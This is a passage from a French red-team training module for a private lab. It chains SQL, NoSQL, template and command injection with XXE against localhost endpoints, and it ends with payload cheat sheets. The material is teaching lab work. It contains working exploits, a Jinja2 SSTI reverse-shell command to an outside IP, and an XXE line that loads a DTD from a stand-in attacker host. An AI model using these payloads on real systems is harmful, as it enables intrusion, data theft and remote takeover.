    # Boucle d'extraction : tente chaque fichier et affiche les 500 premiers caractères
    for f in files_to_read:
        print(f"[*] Lecture de {f}...")
        result = read_file(f)
        # [:] : affiche seulement les 500 premiers caractères (évite de saturer le terminal)
        # Si le fichier n'existe pas ou que l'XXE est bloqué, le résultat sera vide
        print(f"[+] Résultat :\n{result[:500]}")
        print("-" * 50)
```

**Explication du script :**

| Élément | Rôle/Explication |
|---------|------------------|
| `import requests` | Bibliothèque HTTP Python pour envoyer des requêtes |
| `TARGET = "..."` | URL de l'endpoint vulnérable |
| `read_file(filepath)` | Fonction qui construit et envoie le payload XXE pour un fichier donné |
| `<!ENTITY xxe SYSTEM "file://{filepath}">` | Entité externe XXE qui lit le fichier local |
| `requests.post(TARGET, data=..., headers=...)` | Envoie une requête POST avec le XML dans le corps |
| `files_to_read = [...]` | Liste des fichiers cibles à extraire |
| `result[:500]` | Troncature à 500 caractères pour lisibilité |

---

## 7. TP Synthèse

### 7.1 Objectif

Enchaîner SQLi + NoSQLi + SSTI sur le lab pour :
1. Cartographier tous les endpoints vulnérables
2. Associer chaque vulnérabilité à son TXXXX MITRE
3. Extraire des données et exécuter des commandes
4. Remplir un rapport de synthèse

### 7.2 Inventaire des endpoints

```bash
# Scan systématique des endpoints avec gobuster
# -x php,html,json : cherche aussi des fichiers avec ces extensions
# gobuster va tester chaque entrée de la wordlist sur l'URL de base
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,json

# Scan des paramètres avec ffuf (fuzzer rapide)
# FUZZ est un mot-clé que ffuf remplace par chaque entrée de la wordlist
# Permet de découvrir des endpoints sous /api/ (ex: /api/users, /api/search, etc.)
ffuf -u http://localhost:8080/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50

# Vérification manuelle des endpoints découverts
# On définit un tableau bash contenant tous les endpoints à tester
ENDPOINTS=(
  "/api/transactions"
  "/api/login"
  "/api/export"
  "/api/ping"
  "/api/upload-xml"
  "/admin/templates"
  "/admin"
  "/api/users"
  "/api/products"
  "/api/search"
)

# Boucle sur chaque endpoint pour vérifier son code HTTP
# "${ENDPOINTS[@]}" : accède à tous les éléments du tableau
# -o /dev/null : supprime le corps de la réponse (inutile ici)
# -w "Status: %{http_code}\n" : formate l'affichage pour ne montrer que le code HTTP
for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s -o /dev/null -w "Status: %{http_code}\n" "http://localhost:8080$ep"
done
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `gobuster dir -u <URL> -w <wordlist> -t <threads> -x <extensions>` | Brute-force de répertoires/fichiers avec extensions spécifiques |
| `ffuf -u <URL/FUZZ> -w <wordlist> -t <threads>` | Fuzzing : remplace `FUZZ` dans l'URL par chaque mot de la wordlist |
| `ENDPOINTS=(...)` | Déclaration d'un tableau bash contenant les chemins à tester |
| `for ep in "${ENDPOINTS[@]}"; do ... done` | Boucle itérant sur chaque élément du tableau |
| `curl -s -o /dev/null -w "Status: %{http_code}\n"` | Envoie une requête et n'affiche que le code HTTP (`%{http_code}`) |
| `-o /dev/null` | Redirige le corps de la réponse vers le néant (économise l'affichage) |

### 7.3 Cartographie MITRE

| Endpoint | Méthode | Paramètre | Vulnérabilité | MITRE | Impact |
|----------|---------|-----------|---------------|-------|--------|
| `/api/transactions` | GET | `filter` | SQLi (Time-based) | T1190 | Extraction de la base |
| `/api/login` | POST | JSON body | NoSQLi ($ne, $regex) | T1190 | Bypass auth |
| `/api/export` | POST | `collection`, `filter` | NoSQLi ($regex, $where) | T1190 | Extraction complète |
| `/api/ping` | POST | `host` | Command Injection | T1059.004 | RCE |
| `/api/upload-xml` | POST | XML body | XXE | T1190 | Lecture fichiers, SSRF |
| `/admin/templates` | POST | `template` | SSTI (Jinja2) | T1190 | RCE |

### 7.4 Tableau de synthèse

| Vulnérabilité | Endpoint | Technique | Niveau difficulté | Extraction | RCE possible |
|---------------|----------|-----------|:-----------------:|:----------:|:------------:|
| SQLi Time-based | `/api/transactions?filter=` | `SLEEP()` + binaire | ⭐⭐⭐ | Oui (DB) | Via `INTO OUTFILE` |
| NoSQLi Auth Bypass | `/api/login` (POST JSON) | `$ne`, `$gt` | ⭐ | Oui (utilisateurs) | Non |
| NoSQLi Blind | `/api/export` (POST JSON) | `$regex` | ⭐⭐ | Oui (collection) | Via `$where` |
| SSTI Jinja2 | `/admin/templates` (POST form) | `cycler.__init__.__globals__` | ⭐⭐⭐ | Oui (config) | Oui (RCE directe) |
| Command Injection | `/api/ping` (POST form) | `;`, `$(cmd)` | ⭐ | Oui (time-based) | Oui (RCE directe) |
| XXE | `/api/upload-xml` (POST XML) | `<!ENTITY>` | ⭐⭐ | Oui (fichiers) | SSRF, RCE (expect) |

### 7.5 Exercice guidé — Enchaînement complet

#### Phase 1 : Reconnaissance

```bash
# 1. Identifier les technologies du serveur web
# curl -sI : envoie une requête HEAD (sans le corps) en mode silencieux
# grep -iE : recherche des motifs insensible à la casse (-i) avec regex étendue (-E)
# On cherche les headers : server, x-powered-by, set-cookie qui révèlent les technos
curl -sI http://localhost:8080 | grep -iE 'server|x-powered-by|set-cookie'

# 2. Scanner les endpoints (bruteforce de chemins)
# gobuster dir : mode découverte de répertoires
# -u : URL cible
# -w : wordlist contenant les noms de chemins à tester
# -t 50 : 50 threads en parallèle pour accélérer le scan
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -t 50

# 3. Cartographier les méthodes HTTP autorisées
# Boucle for : teste chaque méthode HTTP sur l'endpoint /api/transactions
# -X $method : force la méthode HTTP (GET, POST, PUT, etc.)
# -o /dev/null : jette le corps de la réponse (on ne garde que le code)
# -w "Status: %{http_code}\n" : affiche uniquement le code HTTP de la réponse
for method in GET POST PUT DELETE OPTIONS PATCH; do
  echo "=== $method /api/transactions ==="
  curl -s -X $method -o /dev/null -w "Status: %{http_code}\n" http://localhost:8080/api/transactions
done
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -sI <URL>` | Envoie une requête HEAD (headers uniquement) en mode silencieux |
| `grep -iE 'pattern'` | Filtre la sortie avec une regex, -i = insensible à la casse, -E = regex étendue |
| `gobuster dir -u <URL> -w <wordlist> -t <threads>` | Brute-force de répertoires/fichiers sur le serveur web |
| `curl -s -X <METHOD> -o /dev/null -w "format"` | Teste une méthode HTTP et affiche le code de statut uniquement |
| `-o /dev/null` | Redirige le corps de la réponse vers /dev/null (on ne le voit pas) |
| `-w "Status: %{http_code}\n"` | Format de sortie personnalisé : affiche le code HTTP |

#### Phase 2 : Injection SQL (T1190)

```bash
# 1. Time-based detection : on mesure le temps de la requête
# filter=1'%20OR%20SLEEP(3)%20--%20- : l'apostrophe ferme la chaîne SQL
# OR SLEEP(3) : si l'injection fonctionne, MySQL attend 3 secondes
# -- - : commente la fin de la requête SQL originale
# Si la réponse prend ~3s, la vulnérabilité time-based est confirmée
time curl -s "http://localhost:8080/api/transactions?filter=1'%20OR%20SLEEP(3)%20--%20-"

# 2. Extraire la version : sqlmap liste les bases de données
# --technique=T : force la méthode time-based uniquement
# --batch : mode non-interactif (réponses automatiques par défaut)
# --dbms=mysql : précise le SGBD pour des payloads optimisés
# --dbs : liste toutes les bases de données disponibles
sqlmap -u "http://localhost:8080/api/transactions?filter=1" --technique=T --batch --dbms=mysql --dbs

# 3. Dump des credentials : extrait le contenu de la table users
# -D lab : cible la base de données nommée "lab"
# -T users : cible la table "users"
# --dump : affiche et sauvegarde tout le contenu de la table
sqlmap -u "http://localhost:8080/api/transactions?filter=1" --technique=T --batch -D lab -T users --dump
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `time curl -s` | Mesure le temps d'exécution de la requête curl |
| `%20` | Encodage URL de l'espace (indispensable dans une URL) |
| `--` | Marque la fin de la requête SQL (tout après est commentaire) |
| `sqlmap -u <URL>` | Lance sqlmap sur l'URL cible |
| `--technique=T` | Utilise uniquement la technique time-based (évite les autres) |
| `--batch` | Mode automatique sans interaction utilisateur |
| `--dbms=mysql` | Force le type de base de données (optimise les payloads) |
| `--dbs` | Liste les bases de données disponibles |
| `-D lab` | Sélectionne la base de données "lab" |
| `-T users` | Sélectionne la table "users" |
| `--dump` | Extrait et affiche toutes les données de la table cible |

#### Phase 3 : NoSQL Injection (T1190)

```bash
# 1. Bypass d'authentification : utilise $ne (not equal) pour contourner la vérification
# "$ne": "" signifie "mot de passe différent de chaîne vide" → toujours vrai
# curl -H "Content-Type: application/json" précise que le corps est en JSON
curl -s http://localhost:8080/api/login -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# 2. Extraire les données utilisateur : utilise $regex avec ".*" (match tout)
# La collection "users" est filtrée avec une regex qui correspond à tous les usernames
# Retourne tous les utilisateurs de la collection
curl -s http://localhost:8080/api/export -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"username": {"$regex": ".*"}}}'

# 3. Tester $where pour RCE : injection JavaScript via l'opérateur $where
# this.constructor.constructor("return process.env")() récupère les variables d'environnement
# La fonction constructrice de JavaScript permet d'accéder à l'objet global (process.env)
curl -s http://localhost:8080/api/export -H "Content-Type: application/json" \
  -d '{"collection": "users", "filter": {"$where": "this.constructor.constructor(\"return process.env\")()"}}'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s` | Requête HTTP silencieuse |
| `-H "Content-Type: application/json"` | Header indiquant un corps au format JSON |
| `-d '{...}'` | Corps JSON de la requête |
| `{"$ne": ""}` | Opérateur MongoDB "not equal" — match toute valeur non vide |
| `{"$regex": ".*"}` | Expression régulière "n'importe quel caractère, 0 ou plusieurs fois" |
| `{"$where": "..."}` | Exécute du JavaScript côté MongoDB |
| `this.constructor.constructor("return process.env")()` | Accède au constructeur de fonction pour exécuter du code arbitraire |

#### Phase 4 : SSTI — RCE (T1190)

```bash
# 1. Détection : envoie {{7*7}} comme template
# Si le rendu contient "49", le moteur Jinja2 interprète le code utilisateur
curl -s http://localhost:8080/admin/templates -d "template={{7*7}}"

# 2. RCE avec cycler : exécute cat /app/flag.txt via l'objet global Jinja2
# cycler -> __init__ -> __globals__ -> os.popen() permet d'exécuter des commandes shell
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}"

# 3. Reverse shell : exécute une connexion shell inverse
# bash -c : exécute la chaîne entre guillemets comme commande bash
# bash -i : shell interactif
# >& /dev/tcp/IP/PORT : redirige stdout/stderr vers la socket TCP
# 0>&1 : redirige stdin depuis la socket
curl -s http://localhost:8080/admin/templates \
  -d "template={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s` | Requête HTTP silencieuse |
| `-d "template=..."` | Envoie le paramètre POST `template` avec le payload SSTI |
| `{{7*7}}` | Test de détection : 7×7 = 49 si le template est interprété |
| `cycler.__init__.__globals__.os.popen('cmd').read()` | RCE via l'objet global `cycler` de Jinja2, accède à `os.popen` via `__init__.__globals__` |
| `bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"` | Reverse shell : shell interactif redirigé vers une socket TCP distante |

#### Phase 5 : Command Injection (T1059.004)

```bash
# 1. Détection time-based : on mesure le temps de réponse
# time : affiche le temps d'exécution de la commande curl
# -d "host=8.8.8.8; sleep 3" : injecte un sleep 3s après l'adresse ping
# Si la requête prend ~3s, l'injection de commande fonctionne
time curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; sleep 3"

# 2. Liste des fichiers : injecte ls -la pour lister le répertoire courant
# L'opérateur ; permet d'enchaîner les commandes indépendamment du résultat de ping
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; ls -la"

# 3. Exfiltration : lit le fichier flag.txt via cat
# Le contenu du fichier sera renvoyé dans la réponse HTTP
curl -s http://localhost:8080/api/ping -d "host=8.8.8.8; cat /app/flag.txt"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `time curl ...` | Mesure le temps d'exécution de curl pour détecter le délai de sleep |
| `-s` | Mode silencieux (curl) |
| `-d "host=...; cmd"` | Envoie le paramètre host avec une injection de commande après le `;` |
| `time` (commande) | Commande Unix qui mesure le temps d'exécution d'un programme |
| `sleep 3` | Suspend l'exécution 3 secondes (permet la détection time-based) |
| `ls -la` | Liste les fichiers du répertoire courant avec détails |
| `cat /app/flag.txt` | Affiche le contenu du fichier flag.txt |

#### Phase 6 : XXE — Lecture fichiers (T1190)

```bash
# 1. Lecture de fichier : utilise XXE pour lire /app/flag.txt sur le serveur
# -s : mode silencieux (pas de barre de progression)
# -H "Content-Type: application/xml" : indique que le corps est au format XML
# -d : envoie le corps XML avec l'entité xxe pointant vers file:///app/flag.txt
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<root><data>&xxe;</data></root>'

# 2. SSRF interne : utilise XXE pour scanner le port 3306 (MySQL) en local
# L'entité xxe pointe vers http://localhost:3306 au lieu d'un fichier
# La réponse indiquera si le port est ouvert (timeout ou message d'erreur différent)
curl -s http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3306">]>
<root><data>&xxe;</data></root>'
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `curl -s` | Exécute une requête HTTP silencieuse (sans barre de progression) |
| `-H "Content-Type: application/xml"` | Définit le header Content-Type pour indiquer un corps XML |
| `-d '...'` | Corps de la requête contenant le payload XML |
| `<!ENTITY xxe SYSTEM "file:///app/flag.txt">` | Définit une entité externe qui lit le fichier spécifié |
| `<!ENTITY xxe SYSTEM "http://localhost:3306">` | Définit une entité externe qui fait une requête HTTP (SSRF) |
| `&xxe;` | Référence l'entité pour injecter son contenu dans la réponse |

### 7.6 Rapport de synthèse à remplir

```markdown
# Rapport de synthèse — Module 2

## Cible : http://localhost:8080
## Date : JJ/MM/2026
## Auteur : [Votre nom]

---

### 1. SQL Injection (T1190)
- **Endpoint** : /api/transactions?filter=
- **Type** : Time-based blind MySQL
- **Payload utilisé** : `1' OR SLEEP(3) -- -`
- **Bases extraites** : [______]
- **Données sensibles** : [______]

### 2. NoSQL Injection (T1190)
- **Endpoint** : /api/login, /api/export
- **Opérateurs utilisés** : [______]
- **Collections extraites** : [______]
- **Mots de passe trouvés** : [______]

### 3. SSTI (T1190)
- **Endpoint** : /admin/templates
- **Moteur** : Jinja2
- **Payload RCE** : [______]
- **Flag / donnée extraite** : [______]

### 4. Command Injection (T1059.004)
- **Endpoint** : /api/ping
- **Payload** : [______]
- **Commande exécutée** : [______]

### 5. XXE (T1190)
- **Endpoint** : /api/upload-xml
- **Fichier lu** : [______]
- **SSRF vers** : [______]

---

### Résumé des accès obtenus

| Niveau d'accès | Obtenu ? | Commentaire |
|----------------|----------|-------------|
| Accès base de données | Oui/Non | |
| Contournement authentification | Oui/Non | |
| Exécution de commandes | Oui/Non | |
| Reverse shell | Oui/Non | |
| Lecture fichiers | Oui/Non | |
```

---

## 8. Annexes

### 8.1 Cheatsheet — Payloads rapides

#### SQLi (Time-based)

```sql
-- MySQL : injection basique avec SLEEP (disponible uniquement sous MySQL)
-- ' OR SLEEP(5) --  : L'apostrophe ferme la chaîne SQL, OR SLEEP(5) ajoute une pause de 5s, -- commente la suite
1' OR SLEEP(5) --
-- AND IF(condition, vrai, faux) : exécution conditionnelle de SLEEP
1' AND IF(1=1,SLEEP(5),0) --

-- PostgreSQL : utilise pg_sleep() à la place de SLEEP()
-- (SELECT pg_sleep(5)) : sous-requête qui retourne NULL après 5s de pause
1' OR (SELECT pg_sleep(5)) --
-- CASE WHEN : structure conditionnelle PostgreSQL, exécute pg_sleep(5) si 1=1
1' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) --

-- MSSQL : utilise WAITFOR DELAY au lieu de SLEEP/pg_sleep
-- '; WAITFOR DELAY '0:0:5' : le point-virgule termine la requête, WAITFOR DELAY suspend 5 secondes
1'; WAITFOR DELAY '0:0:5' --
-- IF (condition) WAITFOR DELAY : exécution conditionnelle du délai
1'; IF (1=1) WAITFOR DELAY '0:0:5' --
```

**Explication des payloads par SGBD :**

| SGBD | Fonction | Payload | Effet |
|------|----------|---------|-------|
| MySQL | `SLEEP(n)` | `1' OR SLEEP(5) --` | Suspend la requête 5 secondes si l'injection réussit |
| MySQL | `IF(cond, vrai, faux)` | `1' AND IF(1=1,SLEEP(5),0) --` | Délai conditionnel basé sur une expression booléenne |
| PostgreSQL | `pg_sleep(n)` | `1' OR (SELECT pg_sleep(5)) --` | Suspend via sous-requête PostgreSQL |
| PostgreSQL | `CASE WHEN` | `1' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) --` | Délai conditionnel avec structure CASE |
| MSSQL | `WAITFOR DELAY` | `1'; WAITFOR DELAY '0:0:5' --` | Suspend 5 secondes sur MSSQL |
| MSSQL | `IF ... WAITFOR` | `1'; IF (1=1) WAITFOR DELAY '0:0:5' --` | Délai conditionnel avec IF MSSQL |

#### NoSQL (MongoDB)

```json
// Bypass d'authentification : $ne (not equal) match tout mot de passe non vide
{"username": {"$ne": ""}, "password": {"$ne": ""}}
// Extraction blind via regex : .* match toutes les chaînes possibles
{"username": "admin", "password": {"$regex": ".*"}}
// Time-based via $where : sleep(5000) bloque le serveur 5 secondes
{"$where": "sleep(5000)"}
// Injection $where dans un filtre de collection : toujours vrai (1)
{"collection": "users", "filter": {"$where": "1"}}
```

**Explication des payloads :**

| Payload | Rôle |
|---------|------|
| `{"$ne": ""}` | Opérateur "not equal" — retourne vrai si le champ n'est pas vide (contournement auth) |
| `{"$regex": ".*"}` | Expression régulière "n'importe quoi" — match toute valeur du champ |
| `{"$where": "sleep(5000)"}` | Exécute du JavaScript MongoDB : met en pause 5 secondes (time-based detection) |
| `{"$where": "1"}` | Injection JS qui retourne toujours vrai — confirme la vulnérabilité $where |

#### SSTI (Jinja2)

```jinja
{# Test de détection : 7*7 = 49 si le moteur interprète le template #}
{{ 7*7 }}
{# RCE via l'objet global cycler : accès à os.popen pour exécuter id #}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{# RCE via l'objet global lipsum : alternative à cycler #}
{{ lipsum.__globals__['os'].popen('id').read() }}
{# RCE via l'objet config Flask : remontée par __class__.__init__.__globals__ #}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Explication des payloads :**

| Payload | Rôle |
|---------|------|
| `{{ 7*7 }}` | Test de détection : si le rendu est `49`, le moteur de template interprète le code |
| `{{ cycler.__init__.__globals__.os.popen('id').read() }}` | RCE via `cycler` — objet global Jinja2, on accède à `os.popen` via `__globals__` |
| `{{ lipsum.__globals__['os'].popen('id').read() }}` | RCE via `lipsum` — autre objet global Jinja2, dictionnaire `__globals__` pour atteindre `os` |
| `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` | RCE via `config` — objet Flask, chaînage `__class__.__init__.__globals__` pour accéder aux modules système |

#### Command Injection

```bash
# Enchaînement simple : exécute id après ping, quoi qu'il arrive
; id
# Enchaînement conditionnel : exécute id seulement si la commande précédente réussit
&& id
# Pipe : envoie la sortie de la commande précédente vers id
| id
# Substitution moderne : exécute id et injecte son résultat dans la commande
$(id)
# Substitution ancienne (backticks) : idem, style shell classique
`id`
```

**Explication des opérateurs :**

| Opérateur | Rôle | Comportement |
|-----------|------|-------------|
| `;` | Séparateur de commandes | Exécute la commande suivante quel que soit le code de retour |
| `&&` | ET logique | Exécute la suivante seulement si la précédente réussit (exit 0) |
| `\|` | Pipe | Redirige la sortie standard de la commande de gauche vers l'entrée de celle de droite |
| `$(...)` | Substitution moderne | Remplace `$(...)` par la sortie de la commande à l'intérieur |
| `\`...\`` | Substitution backticks | Ancienne syntaxe, équivalent à `$(...)` |

#### XXE

```xml
<!-- Lecture de fichier local via une entité externe -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!-- XXE out-of-band avec DTD distant pour exfiltration blind -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://EVIL/evil.dtd"> %xxe;]>
```

**Explication des payloads :**

| Payload | Rôle |
|---------|------|
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Définit une entité externe qui lit le fichier `/etc/passwd` |
| `<!ENTITY % xxe SYSTEM "http://EVIL/evil.dtd">` | Définit une entité paramètre qui charge un DTD distant (OOB) |
| `%xxe;` | Référence l'entité paramètre pour déclencher le chargement du DTD externe |

### 8.2 Outils recommandés

| Outil | Utilité | Installation |
|-------|---------|-------------|
| **sqlmap** | SQLi automatisée | `apt install sqlmap` ou `git clone` |
| **NoSQLMap** | NoSQLi automatisée | `git clone https://github.com/codingo/NoSQLMap.git` |
| **Burp Suite** | Proxy d'interception | `apt install burpsuite` |
| **Gobuster** | Brute-force d'endpoints | `apt install gobuster` |
| **FFUF** | Fuzzing rapide | `apt install ffuf` |
| **tplmap** | SSTI automatisée | `git clone https://github.com/epinna/tplmap.git` |
| **Interactsh** | OOB réception | Client OOB (ProjectDiscovery) |

### 8.3 Ressources complémentaires

- **OWASP Injection Cheatsheet** : https://cheatsheetseries.owasp.org/
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks — Injection** : https://book.hacktricks.xyz/
- **PortSwigger Research — SSTI** : https://portswigger.net/research/server-side-template-injection
- **sqlmap Wiki** : https://github.com/sqlmapproject/sqlmap/wiki
- **MITRE ATT&CK — T1190** : https://attack.mitre.org/techniques/T1190/
- **MITRE ATT&CK — T1059.004** : https://attack.mitre.org/techniques/T1059/004/

---

> **Document créé pour le parcours Red Team — Module 2**  
> Ce document est destiné à un usage pédagogique dans le cadre d'un lab privé.  
> N'utilisez ces techniques que sur des systèmes dont vous êtes propriétaire ou pour lesquels vous avez une autorisation écrite explicite.
